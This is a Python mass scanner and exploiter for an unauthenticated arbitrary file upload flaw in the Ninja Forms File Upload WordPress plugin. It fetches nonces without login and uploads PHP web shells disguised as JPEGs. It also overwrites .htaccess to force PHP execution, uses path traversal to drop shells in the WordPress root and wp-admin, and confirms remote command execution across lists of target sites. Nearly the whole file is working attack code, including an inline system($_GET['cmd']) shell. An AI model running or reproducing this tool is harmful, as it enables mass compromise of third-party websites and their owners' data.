#!/usr/bin/env python3
"""
Ninja Forms File Upload <= 3.3.26
Unauthenticated Arbitrary File Upload -> RCE | Mass Scanner + Exploiter

Ref: https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/
     ninja-forms-uploads/ninja-forms-file-upload-3326-unauthenticated-arbitrary-file-upload

Attack Chain:
  1. Obtain nonce with NO auth via wp_ajax_nopriv_nf_fu_get_new_nonce
  2. Upload a .jpg file (passes extension check) whose CONTENT is PHP code
  3. In the same request, pass POST[file_key]=shell.php to rename it on disk
     (file_key = filename with spaces/dots replaced by underscores)
  4. In versions <= 3.3.26 there is NO blacklist or whitelist check on the
     renamed destination, so shell.php lands in wp-content/uploads/ninja-forms/
  5. Browse to shell.php?cmd=id -> RCE

Vulnerable:   Ninja Forms File Upload <= 3.3.26
              (confirmed affected: 3.3.24 and earlier, 3.3.25, 3.3.26)
Fixed in:     3.3.27+ (added blacklist, whitelist, basename/sanitize)
"""

import argparse
import csv
import sys
import json
import random
import string
import re
import time
import threading
import queue
import requests
import urllib3
from pathlib import Path

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BANNER = r"""
 _   _ _       _         _____                          
| \ | (_)_ __ (_) __ _  |  ___|__  _ __ _ __ ___  ___ 
|  \| | | '_ \| |/ _` | | |_ / _ \| '__| '_ ` _ \/ __|
| |\  | | | | | | (_| | |  _| (_) | |  | | | | | \__ \
|_| \_|_|_| |_|_|\__,_| |_|  \___/|_|  |_| |_| |_|___/

  Ninja Forms File Upload <= 3.3.26 — Unauth Arbitrary File Upload -> RCE
  Mass Scanner + Exploiter  |  For authorized testing only
"""

DEFAULT_PAYLOAD_FILE = Path(__file__).parent / "hello.php"
FAKE_IMAGE_MAGIC     = b"\xff\xd8\xff\xe0"  # JPEG magic bytes prefix

# ── RCE detection: must match the specific format of `id` command output ─────
# Pattern: uid=<number>(<name>)  e.g. uid=33(www-data) or uid=0(root)
# This avoids false positives from pages that contain "root", "www", etc.
RCE_PATTERN = re.compile(r'uid=\d+\([^)]+\)\s+gid=\d+', re.ASCII)

# Custom .htaccess to overwrite the plugin's restrictive one.
# Removes ForceType octet-stream so PHP files execute normally on Apache.
# In versions <= 3.3.25 there is no blacklist, so .htaccess can be uploaded.
HTACCESS_BYPASS = b"""# PoC bypass
Options -Indexes
<IfModule mod_mime.c>
  RemoveType .txt .html .htm .csv .json .xml .log .php .phtml .php5 .php7 .phar .shtml
  AddType text/plain .txt .log .csv
  AddType text/html .html .htm
  AddType application/json .json
</IfModule>
<FilesMatch "\\.(php|phtml|php5|php7|phar|shtml)$">
    SetHandler application/x-httpd-php
</FilesMatch>
"""

# .htaccess that makes .jpg files execute as PHP (AddType trick).
# Uploaded alongside a fake .jpg shell to bypass PHP extension blocks.
HTACCESS_ADDTYPE = b"""# AddType bypass - execute .jpg as PHP
AddType application/x-httpd-php .jpg
Options -Indexes
"""

# Extensions to try when .php gives 403 (Apache alternative PHP handlers)
PHP_BYPASS_EXTENSIONS = [".phtml", ".php5", ".php7", ".phar", ".shtml"]

UPLOAD_PATHS = [
    "/wp-content/uploads/ninja-forms/tmp/",
    "/wp-content/uploads/ninja-forms/",
    "/wp-content/uploads/ninja-forms-uploads/tmp/",
    "/wp-content/uploads/ninja-forms-uploads/",
    "/wp-content/uploads/",
]

TIMEOUT       = 12
MAX_THREADS   = 20
RESULTS_FILE  = "vulnerable_sites.txt"

lock = threading.Lock()


def random_name(length=8):
    return ''.join(random.choices(string.ascii_lowercase, k=length))


def make_session():
    s = requests.Session()
    s.headers.update({"User-Agent": "Mozilla/5.0 (compatible; SecurityScanner/1.0)"})
    return s


# ──────────────────────────────────────────────
# 1.  DETECTION
# ──────────────────────────────────────────────

def is_version_vulnerable(version_str):
    """Return True if version <= 3.3.26 (confirmed vulnerable range)."""
    try:
        parts = [int(x) for x in version_str.split(".")]
        while len(parts) < 3:
            parts.append(0)
        return (parts[0], parts[1], parts[2]) <= (3, 3, 26)
    except Exception:
        return True  # unknown version → treat as potentially vulnerable


def detect_plugin(base_url, session, verbose=False):
    """
    Confirm the plugin is installed AND determine if it is vulnerable (<= 3.3.25).
    Strategy:
      a) Try to read readme.txt to extract version (plugin files on disk)
      b) Call nf_fu_get_new_nonce; a JSON reply confirms the plugin is ACTIVE
    Returns: (ajax_active: bool, version: str|None, is_vulnerable: bool)
    """
    readme_url = base_url.rstrip('/') + "/wp-content/plugins/ninja-forms-uploads/readme.txt"
    version    = None

    try:
        r = session.get(readme_url, verify=False, timeout=TIMEOUT)
        if r.status_code == 200:
            m = re.search(r"(?:Stable tag|Version):\s*([\d.]+)", r.text, re.I)
            if m:
                version = m.group(1).strip()
    except Exception:
        pass

    ajax_active = False

    # Probe AJAX endpoint – confirms plugin is active (not just installed)
    ajax_url = base_url.rstrip('/') + "/wp-admin/admin-ajax.php"
    try:
        r = session.post(
            ajax_url,
            data={"action": "nf_fu_get_new_nonce", "field_id": "1"},
            verify=False, timeout=TIMEOUT
        )
        if r.status_code == 200:
            try:
                j = r.json()
                if "success" in j or "data" in j:
                    ajax_active = True
            except Exception:
                pass
    except Exception:
        pass

    # Determine vulnerability:
    # - Primary:   AJAX active + version <= 3.3.25   → VULNERABLE (exploitable)
    # - Secondary: files found  + version <= 3.3.25   → potentially vulnerable
    if ajax_active and version and is_version_vulnerable(version):
        vulnerable = True
    elif not ajax_active and version and is_version_vulnerable(version):
        vulnerable = "potential"   # files present but AJAX not responding
    else:
        vulnerable = False

    if verbose:
        print(f"    [detect] ajax={ajax_active}, version={version}, vulnerable={vulnerable}")

    return ajax_active, version, vulnerable


# ──────────────────────────────────────────────
# 2.  DISCOVER FORM & FIELD IDs FROM SITE PAGES
# ──────────────────────────────────────────────

COMMON_PATHS = ["", "/contact", "/contact-us", "/upload", "/apply",
                "/submit", "/form", "/register", "/join", "/get-involved"]

def discover_form_ids(base_url, session, verbose=False):
    """
    Scrape common pages to find a Ninja Forms file upload field.
    Returns list of (form_id, field_id) tuples found in HTML.
    """
    base   = base_url.rstrip('/')
    found  = []
    seen   = set()

    for path in COMMON_PATHS:
        try:
            r = session.get(base + path, verify=False, timeout=TIMEOUT,
                            allow_redirects=True)
            if r.status_code != 200:
                continue
            html = r.text

            # Ninja Forms embeds data as: nf-form-id="X" or data-form-id="X"
            form_ids = re.findall(r'nf-form-id["\s]*[:=]["\s]*(\d+)', html)
            form_ids += re.findall(r'data-form-id["\s]*=["\s]*["\'](\d+)', html)
            form_ids  = list(set(form_ids))

            # File upload fields: field-type="file" or class containing "file-upload"
            # Ninja Forms renders: id="nf-field-X" where X is the field_id
            # Also: data-field-id="X" on file inputs
            field_ids = re.findall(r'id=["\']nf-field-(\d+)["\']', html)
            field_ids += re.findall(r'data-field-id=["\'](\d+)["\']', html)

            # Look specifically for file-type fields
            # Pattern: "type":"_type_file" or class="nf-field-type-file"
            file_field_ids = re.findall(
                r'nf-field-type-file[^>]*id=["\']nf-field-(\d+)', html)
            file_field_ids += re.findall(
                r'id=["\']nf-field-(\d+)[^>]*nf-field-type-file', html)

            # Also look in inline JSON (Ninja Forms passes settings as JSON)
            # Pattern: {"id":X,"type":"file"} or {"type":"file","id":X}
            json_blocks = re.findall(
                r'\{[^{}]*"type"\s*:\s*"file"[^{}]*"id"\s*:\s*(\d+)[^{}]*\}', html)
            json_blocks += re.findall(
                r'\{[^{}]*"id"\s*:\s*(\d+)[^{}]*"type"\s*:\s*"file"[^{}]*\}', html)
            file_field_ids += json_blocks

            # Combine: try file-specific fields first, then all fields
            candidate_fields = list(set(file_field_ids)) or list(set(field_ids))

            for fid in form_ids:
                for field in candidate_fields:
                    key = (fid, field)
                    if key not in seen:
                        seen.add(key)
                        found.append((int(fid), int(field)))

            # If no field discovered but form found, try field_id=form_id
            # (some simple forms use matching IDs)
            if form_ids and not candidate_fields:
                for fid in form_ids:
                    key = (fid, fid)
                    if key not in seen:
                        seen.add(key)
                        found.append((int(fid), int(fid)))

        except Exception as e:
            if verbose:
                print(f"    [discover] {path}: {e}")
            continue

    if verbose:
        print(f"    [discover] found pairs: {found[:5]}")
    return found


# ──────────────────────────────────────────────
# 3.  GET NONCE (unauthenticated)
# ──────────────────────────────────────────────

def fetch_nonce(base_url, field_id, session, verbose=False):
    ajax_url = base_url.rstrip('/') + "/wp-admin/admin-ajax.php"
    try:
        r = session.post(
            ajax_url,
            data={"action": "nf_fu_get_new_nonce", "field_id": str(field_id)},
            verify=False, timeout=TIMEOUT
        )
        j = r.json()
        if j.get("success"):
            nonce = j.get("data", {}).get("nonce") or j.get("data")
            if isinstance(nonce, str) and nonce:
                if verbose:
                    print(f"    [nonce] {nonce}")
                return nonce
    except Exception as e:
        if verbose:
            print(f"    [nonce] error: {e}")
    return None


# ──────────────────────────────────────────────
# 3.  EXPLOIT  (image disguise + rename trick)
# ──────────────────────────────────────────────

def _do_upload(ajax_url, form_id, field_id, nonce, session,
               dest_filename, content, mime="image/jpeg",
               fake_jpeg=True, verbose=False):
    """
    Core upload helper.
    Sends a fake JPEG (JPEG magic + real content) and renames it on the
    server side via the POST file_key trick (only works in <= 3.3.25).

    file_key derivation (plugin _process()):
        file_key = strtolower(str_replace([' ', '.'], '_', $file['name']))
    So 'rnd.jpg' -> 'rnd_jpg', and we POST rnd_jpg=dest_filename

    fake_jpeg=False: send content as-is (needed for text files like .htaccess)
    """
    img_name  = random_name() + ".jpg"
    file_key  = img_name.replace(".", "_").replace(" ", "_").lower()
    files_key = "files-" + str(field_id).replace(".", "_")
    # Only prepend JPEG magic for binary/PHP payloads, NOT for text config files
    payload   = (FAKE_IMAGE_MAGIC + content) if fake_jpeg else content

    post_data = {
        "action":   "nf_fu_upload",
        "field_id": str(field_id),
        "form_id":  str(form_id),
        "nonce":    nonce,
        file_key:   dest_filename,
    }
    files = {files_key: (img_name, payload, mime)}

    if verbose:
        print(f"    [upload] {img_name} → rename → {dest_filename}")
    try:
        r = session.post(ajax_url, data=post_data, files=files,
                         verify=False, timeout=TIMEOUT)
        j = r.json()
        if verbose:
            print(f"    [upload] response: {json.dumps(j)[:400]}")

        errors     = j.get("errors", [])
        files_data = j.get("data", {}).get("files", [])

        if files_data and not errors:
            saved = files_data[0].get("tmp_name", "")
            if saved:
                if verbose:
                    print(f"    [upload] saved as: {saved}")
                return saved

        if j.get("success") and files_data:
            return files_data[0].get("tmp_name", dest_filename)

        if verbose:
            print(f"    [upload] no file data / errors: {j}")
    except Exception as e:
        if verbose:
            print(f"    [upload] exception: {e}")
    return None


TEXT_EXTENSIONS = {".txt", ".html", ".htm", ".csv", ".json", ".xml",
                   ".log", ".md", ".cfg", ".ini", ".yaml", ".yml"}


def exploit(base_url, form_id, field_id, nonce, session, verbose=False,
            payload_file=None, html_file=None, html_dest="../../../../",
            php_bypass=True):
    """
    Full exploit chain for Ninja Forms File Upload <= 3.3.25.

    Step A : Overwrite .htaccess at all upload directory levels so PHP
             files are allowed to execute (Apache only; Nginx ignores .htaccess).
    Step B : Upload the specified payload file (txt, php, or any extension).
    Step C : [PHP only] Try alternative extensions (.phtml .php5 .php7 .phar)
             in case the server blocks .php specifically.
    Step D : [PHP only] AddType trick — upload a .htaccess that makes .jpg
             execute as PHP, then upload the shell disguised as .jpg.
    Step E : [if --html-file] Upload HTML file to a user-specified path using
             path traversal (default: ../../../../ = WordPress root).

    Returns a dict:
      {
        "main_saved"  : server tmp_name of main payload,
        "main_name"   : final filename on server,
        "alt_names"   : [list of filenames tried with bypass extensions],
        "addtype_name": filename of the .jpg AddType shell (or None),
        "html_name"   : filename of HTML in traversal path (or None),
        "html_dest"   : traversal path used for HTML,
      }
    """
    ajax_url  = base_url.rstrip('/') + "/wp-admin/admin-ajax.php"
    result    = {
        "main_saved": None, "main_name": None,
        "alt_names": [], "addtype_name": None,
        "html_name": None, "html_dest": html_dest,
    }

    if payload_file is None:
        payload_file = DEFAULT_PAYLOAD_FILE
    else:
        payload_file = Path(payload_file)

    dest_filename = payload_file.name
    ext           = Path(dest_filename).suffix.lower()
    is_php        = ext in {".php", ".phtml", ".php5", ".php7", ".phar", ".shtml"}

    try:
        file_content = payload_file.read_bytes()
    except Exception as e:
        if verbose:
            print(f"    [exploit] Cannot read {payload_file}: {e}")
        return result

    needs_jpeg_disguise = ext not in TEXT_EXTENSIONS

    nonce_cur = nonce

    # ── Step A: overwrite .htaccess at multiple directory levels ──────────
    htaccess_targets = [
        "../../.htaccess",   # wp-content/uploads/.htaccess  (most important)
        "../.htaccess",      # wp-content/uploads/ninja-forms/.htaccess
        ".htaccess",         # wp-content/uploads/ninja-forms/tmp/.htaccess
    ]
    for htpath in htaccess_targets:
        if verbose:
            print(f"    [exploit] Step A: overwriting {htpath} ...")
        _do_upload(ajax_url, form_id, field_id, nonce_cur, session,
                   htpath, HTACCESS_BYPASS, fake_jpeg=False, verbose=verbose)
        nonce_cur = fetch_nonce(base_url, field_id, session, verbose=False) or nonce_cur

    # ── Step B: upload main payload ───────────────────────────────────────
    if verbose:
        print(f"    [exploit] Step B: uploading {dest_filename} "
              f"(fake_jpeg={needs_jpeg_disguise}) ...")
    saved = _do_upload(ajax_url, form_id, field_id, nonce_cur, session,
                       dest_filename, file_content,
                       fake_jpeg=needs_jpeg_disguise, verbose=verbose)
    result["main_saved"] = saved
    result["main_name"]  = dest_filename
    nonce_cur = fetch_nonce(base_url, field_id, session, verbose=False) or nonce_cur

    # ── Step C: PHP alternative extension bypass ──────────────────────────
    # Only run if payload is PHP and php_bypass is enabled.
    if is_php and php_bypass:
        stem = Path(dest_filename).stem
        for alt_ext in PHP_BYPASS_EXTENSIONS:
            if alt_ext == ext:
                continue                        # skip current extension
            alt_name = stem + alt_ext
            if verbose:
                print(f"    [exploit] Step C: trying alt extension {alt_name} ...")
            _do_upload(ajax_url, form_id, field_id, nonce_cur, session,
                       alt_name, file_content, fake_jpeg=True, verbose=verbose)
            result["alt_names"].append(alt_name)
            nonce_cur = fetch_nonce(base_url, field_id, session, verbose=False) or nonce_cur

    # ── Step D: AddType trick (.htaccess + shell.jpg) ────────────────────
    # Overwrites .htaccess to treat .jpg as PHP, then uploads the shell as .jpg.
    if is_php and php_bypass:
        stem      = Path(dest_filename).stem
        jpg_shell = stem + "_shell.jpg"
        if verbose:
            print(f"    [exploit] Step D: AddType bypass — uploading htaccess + {jpg_shell} ...")
        # Upload AddType .htaccess to both directory levels
        for htpath in ["../../.htaccess", "../.htaccess", ".htaccess"]:
            _do_upload(ajax_url, form_id, field_id, nonce_cur, session,
                       htpath, HTACCESS_ADDTYPE, fake_jpeg=False, verbose=verbose)
            nonce_cur = fetch_nonce(base_url, field_id, session, verbose=False) or nonce_cur
        # Upload PHP content disguised as .jpg
        _do_upload(ajax_url, form_id, field_id, nonce_cur, session,
                   jpg_shell, file_content, fake_jpeg=True, verbose=verbose)
        result["addtype_name"] = jpg_shell
        nonce_cur = fetch_nonce(base_url, field_id, session, verbose=False) or nonce_cur

    # ── Step E: HTML file via path traversal to user-specified path ───────
    # Default html_dest="../../../../" places file in the WordPress root.
    # WP root is 4 levels above ninja-forms/tmp/:
    #   tmp/ → ninja-forms/ → uploads/ → wp-content/ → WP root
    if html_file:
        html_path = Path(html_file)
        html_content = html_path.read_bytes()
        html_filename = html_path.name
        # Build traversal destination: e.g. "../../../../index.html"
        traversal_dest = html_dest.rstrip("/") + "/" + html_filename
        if verbose:
            print(f"    [exploit] Step E: uploading HTML via traversal → {traversal_dest} ...")
        _do_upload(ajax_url, form_id, field_id, nonce_cur, session,
                   traversal_dest, html_content, fake_jpeg=False, verbose=verbose)
        result["html_name"] = html_filename
        result["html_dest"] = html_dest

    return result


# ──────────────────────────────────────────────
# 4.  FIND & VERIFY SHELL
# ──────────────────────────────────────────────

PHP_EXTENSIONS = {".php", ".phtml", ".php5", ".php7", ".phar", ".shtml", ".jpg"}

# ── Path traversal targets for PHP shell when uploads/ blocks execution ───────
# Each entry: (dest_prefix, verify_url_builder)
# dest_prefix goes in the rename dest_filename sent to the plugin.
# Depth from ninja-forms/tmp/:
#   ../../../../       = WordPress root  (4 levels up)
#   ../../../../wp-admin/  = wp-admin/    (4 up then into wp-admin)
#   ../../../          = wp-content/     (3 levels up)
PHP_TRAVERSAL_TARGETS = [
    ("../../../../",           lambda base, name: f"{base}/{name}"),
    ("../../../../wp-admin/",  lambda base, name: f"{base}/wp-admin/{name}"),
    ("../../../",              lambda base, name: f"{base}/wp-content/{name}"),
]


def try_traversal_php_upload(base_url, ajax_url, form_id, field_id, nonce_ref,
                              session, file_content, shell_name, verbose=False):
    """
    Upload PHP shell to alternative directories (WP root, wp-admin, wp-content)
    via path traversal in the rename dest_filename.

    Used as a fallback when PHP execution is blocked in uploads/ (NOEXEC/403/404).

    Returns (shell_url, "pwned", rce_output) on success, or (None, None, None).
    nonce_ref is a mutable list [nonce] so we can refresh it between attempts.
    """
    for prefix, url_builder in PHP_TRAVERSAL_TARGETS:
        trav_dest = prefix + shell_name
        nonce_cur = nonce_ref[0]

        if verbose:
            print(f"    [traversal] Uploading to {trav_dest} ...")

        saved = _do_upload(ajax_url, form_id, field_id, nonce_cur, session,
                           trav_dest, file_content, fake_jpeg=True, verbose=verbose)

        # refresh nonce regardless of success
        fresh = fetch_nonce(base_url, field_id, session, verbose=False)
        if fresh:
            nonce_ref[0] = fresh

        # Verify — no redirect following (redirect = shell blocked)
        check_url_base = url_builder(base_url.rstrip('/'), shell_name)
        check_url      = check_url_base + "?cmd=id"
        try:
            r = session.get(check_url, verify=False, timeout=TIMEOUT,
                            allow_redirects=False)
            if r.is_redirect or r.status_code in (301, 302, 303, 307, 308):
                if verbose:
                    print(f"    [traversal] redirect at {check_url_base} — blocked")
                continue
            if r.status_code == 200:
                body_raw = r.content
                body     = r.text.strip()
                _m_txt   = RCE_PATTERN.search(body)
                _m_raw   = RCE_PATTERN.search(
                    body_raw.decode("latin-1", errors="replace"))
                if _m_txt or _m_raw:
                    if verbose:
                        print(f"    [traversal] PWNED at {check_url_base}")
                    return check_url_base, "pwned", body
                if verbose:
                    print(f"    [traversal] 200 no-RCE at {check_url_base}")
        except Exception as e:
            if verbose:
                print(f"    [traversal] Error at {check_url_base}: {e}")

    return None, None, None


# ── Output file lock for real-time writing ────────────────────────────────────
_output_file_lock = threading.Lock()


def _append_result_to_file(result, output_file, save_filter="uploaded"):
    """
    Write one result to the output file immediately (thread-safe).

    save_filter controls which results get saved:
      "strict"   – only PWNED and VERIFIED (confirmed shell access)
      "uploaded" – PWNED + VERIFIED + UPLOADED_EXISTS + UPLOADED_403 + UPLOADED_404
                   (any successful upload, even if access is blocked or unclear)
      "all"      – everything above + VULNERABLE sites (detected but not yet exploited)
    """
    if not output_file:
        return

    status = result.get("status", "")
    lines  = []

    if save_filter == "strict":
        if status not in ("PWNED", "VERIFIED"):
            return

    elif save_filter == "all":
        is_interesting = any(k in status for k in
                             ("PWNED", "VERIFIED", "UPLOADED", "VULNERABLE"))
        if not is_interesting:
            return
        # For VULNERABLE-only (no shell yet): log the URL as a comment
        if "VULNERABLE" in status and not result.get("shell"):
            lines.append(
                f"# VULNERABLE: {result['url']}"
                f"  version={result.get('version','?')}"
                f"  status={status}"
            )

    else:  # "uploaded" (default)
        if not any(k in status for k in ("PWNED", "VERIFIED", "UPLOADED", "NOEXEC")):
            return

    if result.get("shell"):
        lines.append(result["shell"])
    for alt in result.get("alt_shells", []):
        lines.append(alt + " [alt]")
    if result.get("html_url"):
        lines.append(f"# HTML_ROOT: {result['html_url']}")

    if lines:
        with _output_file_lock:
            with open(output_file, "a", encoding="utf-8") as f:
                for line in lines:
                    f.write(line + "\n")


JPEG_MAGIC_BYTES = b"\xff\xd8\xff"


def verify_uploaded_file(base_url, shell_name, session,
                         expected_content=None, verbose=False):
    """
    Verify whether the uploaded file is actually reachable on the server.

    Returns:
        (url, access_status, output)

    access_status values:
        'pwned'    – PHP executed: uid=/root in response      → status PWNED
        'verified' – File is 200 AND content matches          → status VERIFIED
        'exists'   – File is 200 but content not verified     → status UPLOADED_EXISTS
        'noexec'   – File served as static (PHP NOT executed, → status UPLOADED_NOEXEC
                     browser sees broken image / raw bytes)
        '403'      – File is forbidden                        → status UPLOADED_403
        'not_found'– 404 everywhere                          → status UPLOADED_404
    """
    base   = base_url.rstrip('/')
    ext    = Path(shell_name).suffix.lower()
    is_php = ext in PHP_EXTENSIONS
    best_403_url  = None
    best_noexec   = None

    for path in UPLOAD_PATHS:
        url = base + path + shell_name
        try:
            if is_php:
                # ── PHP: do NOT follow redirects ───────────────────────────
                # If the server redirects to the homepage (common WAF/security
                # plugin behaviour), we must not follow — a redirect means the
                # file is NOT directly accessible or the shell is blocked.
                check_url = url + "?cmd=id"
                r = session.get(check_url, verify=False, timeout=TIMEOUT,
                                allow_redirects=False)

                # A redirect (3xx) from the shell URL = shell not accessible
                if r.is_redirect or r.status_code in (301, 302, 303, 307, 308):
                    if verbose:
                        loc = r.headers.get("Location", "?")
                        print(f"    [verify] redirect {r.status_code} → {loc} (shell not accessible)")
                    continue  # try next path

                if r.status_code == 200:
                    body_raw = r.content
                    body     = r.text.strip()

                    # ── RCE check (specific pattern, raw + text) ───────────
                    # Use RCE_PATTERN: uid=\d+\([^)]+\)\s+gid=\d+
                    # Also check raw bytes in case text decoding drops chars
                    # (JPEG magic bytes before <?php confuse some decoders).
                    _match_txt = RCE_PATTERN.search(body)
                    _match_raw = RCE_PATTERN.search(
                        body_raw.decode("latin-1", errors="replace"))
                    if _match_txt or _match_raw:
                        if verbose:
                            print(f"    [verify] PWNED (RCE) at {url}")
                        return url, "pwned", body

                    # ── NOEXEC: raw PHP source visible ────────────────────
                    # Only flag NOEXEC when the PHP source code is present in
                    # the response (<?php tag), meaning PHP is not executing.
                    if "<?php" in body or b"<?php" in body_raw:
                        if verbose:
                            print(f"    [verify] NOEXEC (PHP source visible) at {url}")
                        if best_noexec is None:
                            best_noexec = url
                        continue

                    # ── File accessible but no RCE / no source ────────────
                    if len(body_raw) > 0:
                        if verbose:
                            print(f"    [verify] EXISTS (200, no RCE) at {url}")
                        return url, "exists", body

                elif r.status_code == 403:
                    if verbose:
                        print(f"    [verify] 403 at {url}")
                    if best_403_url is None:
                        best_403_url = url
                # 404 → try next path

            else:
                # ── Non-PHP files: follow redirects, check content ─────────
                r = session.get(url, verify=False, timeout=TIMEOUT,
                                allow_redirects=True)
                if r.status_code == 200:
                    body     = r.text.strip()
                    body_raw = r.content

                    if expected_content:
                        expected_str = expected_content.decode(
                            "utf-8", errors="ignore").strip()
                        if expected_str and expected_str in body:
                            if verbose:
                                print(f"    [verify] VERIFIED (content match) at {url}")
                            return url, "verified", body

                    if len(body) > 0:
                        if verbose:
                            print(f"    [verify] EXISTS (200) at {url}")
                        return url, "exists", body

                elif r.status_code == 403:
                    if best_403_url is None:
                        best_403_url = url

        except Exception:
            continue

    # ── Return best partial match ──────────────────────────────────────────
    if best_noexec:
        return best_noexec, "noexec", None

    if best_403_url:
        return best_403_url, "403", None

    return None, "not_found", None


def verify_html_root(base_url, html_filename, session, expected_content=None, verbose=False):
    """Check if HTML file was placed in the web root via path traversal."""
    base = base_url.rstrip('/')
    url  = base + "/" + html_filename
    try:
        r = session.get(url, verify=False, timeout=TIMEOUT)
        if r.status_code == 200 and len(r.text) > 0:
            body = r.text.strip()
            if expected_content:
                exp = expected_content.decode("utf-8", errors="ignore").strip()
                if exp and exp in body:
                    if verbose:
                        print(f"    [html] VERIFIED in root at {url}")
                    return url, body[:300]
            if verbose:
                print(f"    [html] EXISTS in root at {url}")
            return url, body[:300]
    except Exception:
        pass
    return None, None


# ──────────────────────────────────────────────
# 5.  SINGLE TARGET SCAN
# ──────────────────────────────────────────────

def scan_target(base_url, form_id, field_id, verbose=False, exploit_mode=False,
                payload_file=None, html_file=None, html_dest="../../../../",
                php_bypass=True):
    session = make_session()
    result  = {
        "url": base_url, "status": "unknown", "version": None,
        "shell": None, "rce_output": None,
        "html_url": None, "alt_shells": [],
    }

    # ── Step 1: Detect ────────────────────────────────────────────────────
    ajax_active, version, vulnerable = detect_plugin(base_url, session, verbose)
    result["version"] = version

    if vulnerable is False and not ajax_active and not version:
        result["status"] = "not_installed"
        return result

    if vulnerable is False:
        v_str = f"v{version}" if version else "version unknown"
        result["status"] = f"patched ({v_str})"
        return result

    if vulnerable == "potential":
        result["status"] = f"POTENTIAL_VULN (files found v{version}, AJAX inactive)"
        return result

    result["status"] = "VULNERABLE"

    if not exploit_mode:
        return result

    # ── Step 2: Get nonce ─────────────────────────────────────────────────
    nonce = fetch_nonce(base_url, field_id, session, verbose)
    if not nonce:
        result["status"] = "VULNERABLE_nonce_fail"
        return result

    # ── Step 3: Run full exploit chain ────────────────────────────────────
    exp = exploit(base_url, form_id, field_id, nonce, session, verbose,
                  payload_file=payload_file,
                  html_file=html_file,
                  html_dest=html_dest,
                  php_bypass=php_bypass)

    dest_filename = exp.get("main_name") or (
        Path(payload_file).name if payload_file else "hello.php"
    )

    if not exp.get("main_saved") and not exp.get("main_name"):
        result["status"] = "VULNERABLE_upload_fail"
        return result

    # ── Step 4: Read file content + detect extension ─────────────────────
    expected_content = None
    file_content_raw = None
    if payload_file:
        try:
            with open(payload_file, "rb") as pf:
                file_content_raw = pf.read()
                expected_content = file_content_raw
        except Exception:
            expected_content = None

    # If no custom payload, use the default PHP shell
    if file_content_raw is None:
        try:
            file_content_raw = DEFAULT_PAYLOAD_FILE.read_bytes()
        except Exception:
            file_content_raw = b"<?php system($_GET['cmd']); ?>"

    dest_ext   = Path(dest_filename).suffix.lower()
    is_php_ext = dest_ext in {".php", ".phtml", ".php5", ".php7", ".phar", ".shtml"}

    # ── Step 5: Verify main payload access ────────────────────────────────
    shell_url, access_status, rce_output = verify_uploaded_file(
        base_url, dest_filename, session,
        expected_content=expected_content, verbose=verbose
    )

    # Map access_status → result status
    if access_status == "pwned":
        result["status"]     = "PWNED"
        result["shell"]      = shell_url
        result["rce_output"] = rce_output
    elif access_status == "verified":
        result["status"]     = "VERIFIED"
        result["shell"]      = shell_url
        result["rce_output"] = rce_output
    elif access_status == "exists":
        result["status"]     = "UPLOADED_EXISTS"
        result["shell"]      = shell_url
        result["rce_output"] = rce_output
    elif access_status == "noexec":
        result["status"] = "UPLOADED_NOEXEC"
        result["shell"]  = shell_url or f"{base_url}/wp-content/uploads/ninja-forms/{dest_filename}"
    elif access_status == "403":
        result["status"]     = "UPLOADED_403"
        result["shell"]      = shell_url or f"{base_url}/wp-content/uploads/ninja-forms/{dest_filename}"
    else:
        result["status"] = "UPLOADED_404"
        result["shell"]  = f"{base_url}/wp-content/uploads/ninja-forms/{dest_filename}"

    # ── Step 5b: Path Traversal PHP Upload (fallback when uploads/ blocks exec) ──
    # When PHP won't execute inside uploads/ (NOEXEC, 403, 404), try uploading
    # the shell directly to WordPress root / wp-admin / wp-content via path
    # traversal in the rename dest_filename.  These directories almost always
    # allow PHP execution even on hardened shared hosts.
    if (is_php_ext and php_bypass
            and result["status"] in ("UPLOADED_NOEXEC", "UPLOADED_403", "UPLOADED_404")
            and result["status"] != "PWNED"):
        ajax_url  = base_url.rstrip('/') + "/wp-admin/admin-ajax.php"
        fresh_nonce = fetch_nonce(base_url, field_id, session, verbose=False) or nonce
        nonce_ref   = [fresh_nonce]
        if verbose:
            print(f"    [traversal] PHP blocked in uploads/ — trying WP root / wp-admin / wp-content ...")
        trav_url, trav_status, trav_out = try_traversal_php_upload(
            base_url, ajax_url, form_id, field_id, nonce_ref,
            session, file_content_raw, dest_filename, verbose=verbose
        )
        if trav_status == "pwned":
            result["status"]     = "PWNED"
            result["shell"]      = trav_url
            result["rce_output"] = trav_out
            result["alt_shells"].append(trav_url)
            if verbose:
                print(f"    [traversal] SUCCESS — shell in WP root: {trav_url}")
        elif trav_url and verbose:
            print(f"    [traversal] File landed at {trav_url} but PHP still not executing")

    # ── Step 6: Verify alternative PHP extension shells ───────────────────
    for alt_name in exp.get("alt_names", []):
        url, astatus, out = verify_uploaded_file(base_url, alt_name, session, verbose=verbose)
        if astatus == "pwned":
            result["alt_shells"].append(url)
            if result["status"] != "PWNED":
                result["status"]     = "PWNED"
                result["shell"]      = url
                result["rce_output"] = out

    # ── Step 6b: Verify AddType (.jpg) shell ──────────────────────────────
    addtype_name = exp.get("addtype_name")
    if addtype_name:
        url, astatus, out = verify_uploaded_file(base_url, addtype_name, session, verbose=verbose)
        if astatus == "pwned":
            result["alt_shells"].append(url)
            if result["status"] != "PWNED":
                result["status"]     = "PWNED"
                result["shell"]      = url
                result["rce_output"] = out

    # ── Step 7: Verify HTML in web root ───────────────────────────────────
    if exp.get("html_name"):
        html_content = None
        if html_file:
            try:
                with open(html_file, "rb") as hf:
                    html_content = hf.read()
            except Exception:
                pass
        html_url, _ = verify_html_root(base_url, exp["html_name"], session,
                                        expected_content=html_content, verbose=verbose)
        result["html_url"] = html_url or f"{base_url}/{exp['html_name']}"

    return result


# ──────────────────────────────────────────────
# 6.  MASS SCAN FROM CSV
# ──────────────────────────────────────────────

def load_urls_from_file(file_path):
    """Load URLs from a CSV file (with 'link'/'host' column) or a plain TXT file (one URL per line)."""
    file_path = Path(file_path)
    urls = []

    if file_path.suffix.lower() == ".csv":
        with open(file_path, newline='', encoding='utf-8-sig') as f:
            reader = csv.DictReader(f)
            for row in reader:
                url = row.get("link") or row.get("host") or ""
                url = url.strip()
                if url and url.startswith("http"):
                    urls.append(url)
    else:
        # Plain text: one URL per line
        with open(file_path, encoding='utf-8-sig') as f:
            for line in f:
                url = line.strip()
                if url and url.startswith("http"):
                    urls.append(url)

    # Deduplicate while preserving order
    seen = set()
    deduped = []
    for u in urls:
        if u not in seen:
            seen.add(u)
            deduped.append(u)
    return deduped


